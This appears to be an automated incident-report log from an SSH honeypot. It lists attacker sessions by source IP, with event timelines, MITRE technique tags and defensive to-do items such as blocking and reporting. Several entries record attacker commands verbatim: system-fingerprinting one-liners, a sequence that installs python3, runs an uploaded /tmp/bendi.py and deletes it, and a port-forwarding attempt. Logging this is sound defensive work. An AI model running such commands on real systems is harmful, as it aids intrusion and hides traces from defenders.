### 🔴 HIGH · IR-9e5bd35adf35

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:28 |
| **Last Seen** | 2026-07-06 15:28 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:28:23` | `cowrie.session.connect` |
| `2026-07-06 15:28:25` | `cowrie.client.version` |
| `2026-07-06 15:28:25` | `cowrie.client.kex` |
| `2026-07-06 15:28:34` | `cowrie.login.success` |
| `2026-07-06 15:28:36` | `cowrie.session.params` |
| `2026-07-06 15:28:36` | `cowrie.command.input` |
| `2026-07-06 15:28:36` | `cowrie.command.input` |
| `2026-07-06 15:28:36` | `cowrie.command.input` |
| `2026-07-06 15:28:36` | `cowrie.command.input` |
| `2026-07-06 15:28:36` | `cowrie.command.input` |
| `2026-07-06 15:28:36` | `cowrie.command.success` |
| `2026-07-06 15:28:36` | `cowrie.command.input` |
| `2026-07-06 15:28:36` | `cowrie.command.input` |
| `2026-07-06 15:28:36` | `cowrie.command.input` |
| `2026-07-06 15:28:36` | `cowrie.command.input` |
| `2026-07-06 15:28:37` | `cowrie.log.closed` |
| `2026-07-06 15:28:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42a33cb5db39

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:29 |
| **Last Seen** | 2026-07-06 15:30 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:29:49` | `cowrie.session.connect` |
| `2026-07-06 15:29:51` | `cowrie.client.version` |
| `2026-07-06 15:29:51` | `cowrie.client.kex` |
| `2026-07-06 15:30:02` | `cowrie.login.success` |
| `2026-07-06 15:30:07` | `cowrie.session.params` |
| `2026-07-06 15:30:07` | `cowrie.command.input` |
| `2026-07-06 15:30:07` | `cowrie.command.input` |
| `2026-07-06 15:30:07` | `cowrie.command.input` |
| `2026-07-06 15:30:07` | `cowrie.command.input` |
| `2026-07-06 15:30:07` | `cowrie.command.input` |
| `2026-07-06 15:30:07` | `cowrie.command.success` |
| `2026-07-06 15:30:07` | `cowrie.command.input` |
| `2026-07-06 15:30:07` | `cowrie.command.input` |
| `2026-07-06 15:30:07` | `cowrie.command.input` |
| `2026-07-06 15:30:07` | `cowrie.command.input` |
| `2026-07-06 15:30:11` | `cowrie.log.closed` |
| `2026-07-06 15:30:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43aacf7a85ec

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:31 |
| **Last Seen** | 2026-07-06 15:31 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:31:09` | `cowrie.session.connect` |
| `2026-07-06 15:31:14` | `cowrie.client.version` |
| `2026-07-06 15:31:14` | `cowrie.client.kex` |
| `2026-07-06 15:31:28` | `cowrie.login.success` |
| `2026-07-06 15:31:36` | `cowrie.session.params` |
| `2026-07-06 15:31:36` | `cowrie.command.input` |
| `2026-07-06 15:31:36` | `cowrie.command.input` |
| `2026-07-06 15:31:36` | `cowrie.command.input` |
| `2026-07-06 15:31:36` | `cowrie.command.input` |
| `2026-07-06 15:31:36` | `cowrie.command.input` |
| `2026-07-06 15:31:36` | `cowrie.command.success` |
| `2026-07-06 15:31:36` | `cowrie.command.input` |
| `2026-07-06 15:31:36` | `cowrie.command.input` |
| `2026-07-06 15:31:36` | `cowrie.command.input` |
| `2026-07-06 15:31:36` | `cowrie.command.input` |
| `2026-07-06 15:31:39` | `cowrie.log.closed` |
| `2026-07-06 15:31:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bb32557059a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:32 |
| **Last Seen** | 2026-07-06 15:32 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:32:40` | `cowrie.session.connect` |
| `2026-07-06 15:32:42` | `cowrie.client.version` |
| `2026-07-06 15:32:42` | `cowrie.client.kex` |
| `2026-07-06 15:32:53` | `cowrie.login.success` |
| `2026-07-06 15:32:54` | `cowrie.session.params` |
| `2026-07-06 15:32:54` | `cowrie.command.input` |
| `2026-07-06 15:32:54` | `cowrie.command.input` |
| `2026-07-06 15:32:54` | `cowrie.command.input` |
| `2026-07-06 15:32:54` | `cowrie.command.input` |
| `2026-07-06 15:32:54` | `cowrie.command.input` |
| `2026-07-06 15:32:54` | `cowrie.command.success` |
| `2026-07-06 15:32:54` | `cowrie.command.input` |
| `2026-07-06 15:32:54` | `cowrie.command.input` |
| `2026-07-06 15:32:54` | `cowrie.command.input` |
| `2026-07-06 15:32:54` | `cowrie.command.input` |
| `2026-07-06 15:32:55` | `cowrie.log.closed` |
| `2026-07-06 15:32:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3af7e881121

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-06 15:33 |
| **Last Seen** | 2026-07-06 15:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:33:27` | `cowrie.session.connect` |
| `2026-07-06 15:33:27` | `cowrie.client.version` |
| `2026-07-06 15:33:27` | `cowrie.client.kex` |
| `2026-07-06 15:33:27` | `cowrie.login.success` |
| `2026-07-06 15:33:28` | `cowrie.session.params` |
| `2026-07-06 15:33:28` | `cowrie.command.input` |
| `2026-07-06 15:33:28` | `cowrie.log.closed` |
| `2026-07-06 15:33:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-649860990688

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-06 15:33 |
| **Last Seen** | 2026-07-06 15:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:33:27` | `cowrie.session.connect` |
| `2026-07-06 15:33:27` | `cowrie.client.version` |
| `2026-07-06 15:33:27` | `cowrie.client.kex` |
| `2026-07-06 15:33:28` | `cowrie.login.success` |
| `2026-07-06 15:33:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41154b701be6

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-06 15:33 |
| **Last Seen** | 2026-07-06 15:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:33:28` | `cowrie.session.connect` |
| `2026-07-06 15:33:28` | `cowrie.client.version` |
| `2026-07-06 15:33:28` | `cowrie.client.kex` |
| `2026-07-06 15:33:28` | `cowrie.login.success` |
| `2026-07-06 15:33:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58c53b1bec37

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-06 15:33 |
| **Last Seen** | 2026-07-06 15:35 |
| **Session Duration** | 125s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:33:49` | `cowrie.session.connect` |
| `2026-07-06 15:33:49` | `cowrie.client.version` |
| `2026-07-06 15:33:49` | `cowrie.client.kex` |
| `2026-07-06 15:33:49` | `cowrie.login.success` |
| `2026-07-06 15:33:50` | `cowrie.session.file_upload` |
| `2026-07-06 15:33:51` | `cowrie.session.params` |
| `2026-07-06 15:33:51` | `cowrie.command.input` |
| `2026-07-06 15:33:51` | `cowrie.command.input` |
| `2026-07-06 15:33:51` | `cowrie.command.input` |
| `2026-07-06 15:33:51` | `cowrie.command.failed` |
| `2026-07-06 15:33:51` | `cowrie.log.closed` |
| `2026-07-06 15:33:52` | `cowrie.session.params` |
| `2026-07-06 15:33:52` | `cowrie.command.input` |
| `2026-07-06 15:33:52` | `cowrie.log.closed` |
| `2026-07-06 15:33:52` | `cowrie.session.params` |
| `2026-07-06 15:33:52` | `cowrie.command.input` |
| `2026-07-06 15:33:53` | `cowrie.log.closed` |
| `2026-07-06 15:33:53` | `cowrie.session.params` |
| `2026-07-06 15:33:53` | `cowrie.command.input` |
| `2026-07-06 15:33:53` | `cowrie.command.failed` |
| `2026-07-06 15:33:53` | `cowrie.command.failed` |
| `2026-07-06 15:34:54` | `cowrie.session.params` |
| `2026-07-06 15:34:54` | `cowrie.command.input` |
| `2026-07-06 15:35:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1689a11c4d85

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:34 |
| **Last Seen** | 2026-07-06 15:34 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:34:06` | `cowrie.session.connect` |
| `2026-07-06 15:34:11` | `cowrie.client.version` |
| `2026-07-06 15:34:11` | `cowrie.client.kex` |
| `2026-07-06 15:34:22` | `cowrie.login.success` |
| `2026-07-06 15:34:25` | `cowrie.session.params` |
| `2026-07-06 15:34:25` | `cowrie.command.input` |
| `2026-07-06 15:34:25` | `cowrie.command.input` |
| `2026-07-06 15:34:25` | `cowrie.command.input` |
| `2026-07-06 15:34:25` | `cowrie.command.input` |
| `2026-07-06 15:34:25` | `cowrie.command.input` |
| `2026-07-06 15:34:25` | `cowrie.command.success` |
| `2026-07-06 15:34:25` | `cowrie.command.input` |
| `2026-07-06 15:34:25` | `cowrie.command.input` |
| `2026-07-06 15:34:25` | `cowrie.command.input` |
| `2026-07-06 15:34:25` | `cowrie.command.input` |
| `2026-07-06 15:34:27` | `cowrie.log.closed` |
| `2026-07-06 15:34:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-865c80147f2e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 15:35 |
| **Last Seen** | 2026-07-06 15:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:35:09` | `cowrie.session.connect` |
| `2026-07-06 15:35:09` | `cowrie.client.version` |
| `2026-07-06 15:35:09` | `cowrie.client.kex` |
| `2026-07-06 15:35:10` | `cowrie.login.success` |
| `2026-07-06 15:35:10` | `cowrie.direct-tcpip.request` |
| `2026-07-06 15:35:10` | `cowrie.direct-tcpip.data` |
| `2026-07-06 15:35:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-337f9009d6c0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:35 |
| **Last Seen** | 2026-07-06 15:35 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:35:38` | `cowrie.session.connect` |
| `2026-07-06 15:35:41` | `cowrie.client.version` |
| `2026-07-06 15:35:41` | `cowrie.client.kex` |
| `2026-07-06 15:35:49` | `cowrie.login.success` |
| `2026-07-06 15:35:51` | `cowrie.session.params` |
| `2026-07-06 15:35:51` | `cowrie.command.input` |
| `2026-07-06 15:35:51` | `cowrie.command.input` |
| `2026-07-06 15:35:51` | `cowrie.command.input` |
| `2026-07-06 15:35:51` | `cowrie.command.input` |
| `2026-07-06 15:35:51` | `cowrie.command.input` |
| `2026-07-06 15:35:51` | `cowrie.command.success` |
| `2026-07-06 15:35:51` | `cowrie.command.input` |
| `2026-07-06 15:35:51` | `cowrie.command.input` |
| `2026-07-06 15:35:51` | `cowrie.command.input` |
| `2026-07-06 15:35:51` | `cowrie.command.input` |
| `2026-07-06 15:35:54` | `cowrie.log.closed` |
| `2026-07-06 15:35:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dd428902b1a

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 15:35 |
| **Last Seen** | 2026-07-06 15:36 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:35:50` | `cowrie.session.connect` |
| `2026-07-06 15:35:53` | `cowrie.client.version` |
| `2026-07-06 15:35:53` | `cowrie.client.kex` |
| `2026-07-06 15:35:58` | `cowrie.login.success` |
| `2026-07-06 15:36:02` | `cowrie.session.params` |
| `2026-07-06 15:36:02` | `cowrie.command.input` |
| `2026-07-06 15:36:03` | `cowrie.log.closed` |
| `2026-07-06 15:36:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da37c5f4006a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:36 |
| **Last Seen** | 2026-07-06 15:37 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:36:58` | `cowrie.session.connect` |
| `2026-07-06 15:37:00` | `cowrie.client.version` |
| `2026-07-06 15:37:04` | `cowrie.client.kex` |
| `2026-07-06 15:37:14` | `cowrie.login.success` |
| `2026-07-06 15:37:20` | `cowrie.session.params` |
| `2026-07-06 15:37:20` | `cowrie.command.input` |
| `2026-07-06 15:37:20` | `cowrie.command.input` |
| `2026-07-06 15:37:20` | `cowrie.command.input` |
| `2026-07-06 15:37:20` | `cowrie.command.input` |
| `2026-07-06 15:37:20` | `cowrie.command.input` |
| `2026-07-06 15:37:20` | `cowrie.command.success` |
| `2026-07-06 15:37:20` | `cowrie.command.input` |
| `2026-07-06 15:37:20` | `cowrie.command.input` |
| `2026-07-06 15:37:20` | `cowrie.command.input` |
| `2026-07-06 15:37:20` | `cowrie.command.input` |
| `2026-07-06 15:37:23` | `cowrie.log.closed` |
| `2026-07-06 15:37:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-743448c85fd1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:38 |
| **Last Seen** | 2026-07-06 15:38 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:38:16` | `cowrie.session.connect` |
| `2026-07-06 15:38:17` | `cowrie.client.version` |
| `2026-07-06 15:38:17` | `cowrie.client.kex` |
| `2026-07-06 15:38:24` | `cowrie.login.success` |
| `2026-07-06 15:38:26` | `cowrie.session.params` |
| `2026-07-06 15:38:26` | `cowrie.command.input` |
| `2026-07-06 15:38:26` | `cowrie.command.input` |
| `2026-07-06 15:38:26` | `cowrie.command.input` |
| `2026-07-06 15:38:26` | `cowrie.command.input` |
| `2026-07-06 15:38:26` | `cowrie.command.input` |
| `2026-07-06 15:38:26` | `cowrie.command.success` |
| `2026-07-06 15:38:26` | `cowrie.command.input` |
| `2026-07-06 15:38:26` | `cowrie.command.input` |
| `2026-07-06 15:38:26` | `cowrie.command.input` |
| `2026-07-06 15:38:26` | `cowrie.command.input` |
| `2026-07-06 15:38:28` | `cowrie.log.closed` |
| `2026-07-06 15:38:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c35245fa14f4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:39 |
| **Last Seen** | 2026-07-06 15:39 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:39:21` | `cowrie.session.connect` |
| `2026-07-06 15:39:25` | `cowrie.client.version` |
| `2026-07-06 15:39:25` | `cowrie.client.kex` |
| `2026-07-06 15:39:36` | `cowrie.login.success` |
| `2026-07-06 15:39:39` | `cowrie.session.params` |
| `2026-07-06 15:39:39` | `cowrie.command.input` |
| `2026-07-06 15:39:39` | `cowrie.command.input` |
| `2026-07-06 15:39:39` | `cowrie.command.input` |
| `2026-07-06 15:39:39` | `cowrie.command.input` |
| `2026-07-06 15:39:39` | `cowrie.command.input` |
| `2026-07-06 15:39:39` | `cowrie.command.success` |
| `2026-07-06 15:39:39` | `cowrie.command.input` |
| `2026-07-06 15:39:39` | `cowrie.command.input` |
| `2026-07-06 15:39:39` | `cowrie.command.input` |
| `2026-07-06 15:39:39` | `cowrie.command.input` |
| `2026-07-06 15:39:42` | `cowrie.log.closed` |
| `2026-07-06 15:39:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e91152cdcea2

| Field | Detail |
|---|---|
